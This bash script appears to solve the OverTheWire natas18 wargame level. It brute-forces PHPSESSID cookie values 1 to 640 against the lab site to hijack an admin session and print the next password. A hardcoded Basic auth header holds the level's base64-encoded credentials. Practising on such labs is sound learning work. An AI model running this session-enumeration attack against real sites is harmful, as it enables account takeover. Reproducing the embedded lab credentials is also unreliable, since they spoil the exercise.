#!/bin/bash

SECONDS=0

function perform_request(){
  curl -s 'http://natas18.natas.labs.overthewire.org/' \
    -H 'Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36' \
    -H "Cookie: PHPSESSID=$1" \
    --compressed \
    --insecure
}

function brute_force(){
  for sid in {1..640}; do 
    perform_request $sid | grep "Password: " | cut -d"<" -f 1 | grep "Password: " && break
  done
}

function main(){
  brute_force
}

export -f {perform_request,brute_force}

main

echo -e "\n$SECONDS secs"
